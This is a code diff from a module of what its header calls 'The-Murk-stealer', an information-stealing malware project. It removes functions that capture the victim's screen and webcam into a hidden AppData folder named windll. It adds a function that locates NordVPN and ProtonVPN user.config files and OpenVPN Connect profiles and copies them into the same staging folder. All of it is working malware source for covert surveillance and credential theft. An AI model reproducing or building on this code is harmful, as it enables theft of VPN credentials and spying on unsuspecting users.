@@ -9,27 +9,36 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
-from PIL import ImageGrab
-from os import environ,sep
-import cv2
 
-def Screenshot():
-	try:
-		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
-		screen = ImageGrab.grab()
-		screen.save(rf'{pathtofolder}\windll\Photos\sreenshot.jpg')
-		print("screen")
-	except Exception as e:
-		print(e)
+import os
+import glob
+from shutil import copy
 
-def WebCam(): 
-	try:
-		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
-		cap = cv2.VideoCapture(0)
-		for i in range(30):
-			cap.read()
-		ret, frame = cap.read()
-		cv2.imwrite(pathtofolder+'\\windll\\Photos\\webcam.png', frame)   
-		cap.release()
-	except:
-	    pass
+def VPN(data):
+     
+    local = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+    appdata = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'
+
+    directory = {
+        'Nord VPN': local + '\\NordVPN\\',
+        'Open VPN': appdata + '\\OpenVPN Connect\\profiles\\',
+        'Proton VPN': local + '\\ProtonVPN\\'
+    }
+    
+    logs = {}
+    for key, value in directory.items():
+        if os.path.exists(value):
+            if key == 'Nord VPN':
+                logs[key] = ''.join(glob.glob(value+"\\NordVPN.exe*"))+'\\'+os.listdir(''.join(glob.glob(value+"\\NordVPN.exe*")))[0] + '\\user.config'
+            if key == 'Open VPN':
+                logs[key] = value+os.listdir(value)[0]
+            if key == 'Proton VPN':
+                logs[key] = ''.join(glob.glob(value+"\\ProtonVPN.exe*"))+'\\'+os.listdir(''.join(glob.glob(value+"\\ProtonVPN.exe*")))[0] + '\\user.config'
+    
+    if logs:
+            data.append("\n\n📡VPN")
+            os.mkdir(rf'{local}\windll\Messengers\VPN')
+            for key, value in logs.items():
+                os.mkdir(rf'{local}\windll\Messengers\VPN/'+key+'\\')
+                copy(value, rf'{local}\windll\Messengers\VPN/'+key+'\\')
+    return data
